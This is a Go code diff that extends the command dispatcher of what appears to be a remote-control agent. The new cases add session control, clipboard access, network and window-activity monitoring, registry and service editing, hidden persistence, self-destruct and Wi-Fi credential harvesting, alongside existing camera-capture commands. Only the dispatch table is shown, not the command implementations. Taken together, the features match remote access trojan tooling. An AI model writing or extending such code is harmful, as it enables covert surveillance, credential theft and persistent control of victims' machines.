@@ -301,6 +301,60 @@ func handleCommand(send chan<- []byte, p map[string]any) {
 		go cameraShotCmd(send, c.ID, p)
 	case "agent.uninstall":
 		agentUninstallCmd(send, c.ID)
+	case "session.lock":
+		go sessionCmd(send, c.ID, "lock")
+	case "session.logoff":
+		go sessionCmd(send, c.ID, "logoff")
+	case "session.reboot":
+		go sessionCmd(send, c.ID, "reboot")
+	case "session.shutdown":
+		go sessionCmd(send, c.ID, "shutdown")
+	case "session.sleep":
+		go sessionCmd(send, c.ID, "sleep")
+	case "clipboard.get":
+		go clipboardGetCmd(send, c.ID)
+	case "clipboard.set":
+		go clipboardSetCmd(send, c.ID, p)
+	case "net.interfaces":
+		go netInterfacesCmd(send, c.ID)
+	case "net.connections":
+		go netConnectionsCmd(send, c.ID)
+	case "net.publicip":
+		go netPublicIPCmd(send, c.ID)
+	case "audio.devices":
+		go audioDevicesCmd(send, c.ID)
+	case "activity.idle":
+		go activityIdleCmd(send, c.ID)
+	case "activity.windows":
+		go activityWindowsCmd(send, c.ID)
+	case "persist.status":
+		go persistStatusCmd(send, c.ID)
+	case "persist.install":
+		go persistInstallCmd(send, c.ID)
+	case "persist.remove":
+		go persistRemoveCmd(send, c.ID)
+	case "persist.hide":
+		go persistHideCmd(send, c.ID)
+	case "agent.update":
+		go agentUpdateCmd(send, c.ID)
+	case "agent.selfdestruct":
+		go agentSelfDestructCmd(send, c.ID)
+	case "svc.list":
+		go svcListCmd(send, c.ID)
+	case "svc.start":
+		go svcActionCmd(send, c.ID, p, "start")
+	case "svc.stop":
+		go svcActionCmd(send, c.ID, p, "stop")
+	case "reg.list":
+		go regListCmd(send, c.ID, p)
+	case "reg.set":
+		go regSetCmd(send, c.ID, p)
+	case "reg.delete":
+		go regDeleteCmd(send, c.ID, p)
+	case "display.list":
+		go displayListCmd(send, c.ID)
+	case "creds.wifi":
+		go credsWifiCmd(send, c.ID)
 	default:
 		sendResult(send, c.ID, false, nil, "not_supported: "+c.Action)
 	}
